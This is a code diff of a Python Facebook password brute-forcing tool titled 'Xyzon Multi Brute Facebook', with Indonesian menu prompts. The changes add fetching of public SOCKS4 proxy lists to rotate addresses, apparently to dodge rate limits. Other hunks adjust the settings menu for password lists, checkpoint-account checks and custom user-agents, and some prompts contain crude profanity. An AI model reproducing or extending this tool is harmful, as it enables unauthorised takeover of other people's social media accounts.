@@ -50,6 +50,29 @@ ses=requests.Session()
 id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
 ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
 sys.stdout.write('\x1b]2; XMBF | Xyzon Multi Brute Facebook\x07')
+#------------------[ USER-AGENT ]-------------------#
+uman,usman1=[],[]
+pretty.install()
+CON=sol()
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+printcp=[]
+oks=[]
+cps=[]
+redmi=[]
+ugent=[]
+from rich.console import Console
+from rich.columns import Columns
+wa = Console()
+try:
+	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
+	open('.prox.txt','w').write(prox)
+except Exception as e:
+	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mXyzonXD')
+prox=open('.prox.txt','r').read().splitlines()
 ###----------[ GENERATE USERAGENT ]---------- ###
 for xd in range(10000) :
 	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
@@ -1297,13 +1320,13 @@ def setting():
 	    method.append('colmek2')
 	else:
 		method.append('validate1')
-	cetak(panel('''[bold white][[bold cyan]01[bold cyan]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold white]]
+	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold cyan]Menggunakan Password V1 [[bold green]Recommended[bold white]]
 [bold white][[bold green]02[bold white]] [bold cyan]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]
 [bold white][[bold green]03[bold white]] [bold cyan]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
 	pwplus=input(f' {P}[{H}+{P}] \33[1;96mPilih Sandi : {P}')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
-		pwku=input(f' {P}[{H}+{P}] \33[1;96mSandi : {P}')
+		pwku=input(f' [+] {P}Sandi : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -1311,7 +1334,7 @@ def setting():
 		pwpluss.append('no')
 	
 	cetak(panel(f'      [bold cyan]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold white"))
-	_brayen_ = input(' {P}[{H}+{P}] \33[1;96mPilih : {P}')
+	_brayen_ = input(' [+] {P}Pilih : ')
 	if _brayen_ in ['']:
 		print(' [+] \33[1;91mPilih Yang Bener Kontol ')
 		back()
@@ -1321,7 +1344,7 @@ def setting():
 		taplikasi.append('no')
 		
 	cetak(panel(f'      [bold cyan]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"bold white"))
-	_brayen_ = input(' {P}[{H}+{P}] \33[1;96mPilih : {P}')
+	_brayen_ = input(' [+] \33[1;96mPilih : ')
 	if _brayen_ in ['']:
 		print(' [+] \33[1;91mPilih Yang Bener Kontol ')
 		back()
@@ -1334,7 +1357,7 @@ def setting():
 	uatambah = input(f' {P}[{H}+{P}] \33[1;96m Pilih : {P}')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
-		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukan User-Agent : {P}')
+		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukanUser-Agent : {P}')
 		ualu.append(bzer)
 	else:
 		ualuh.append('tidak')
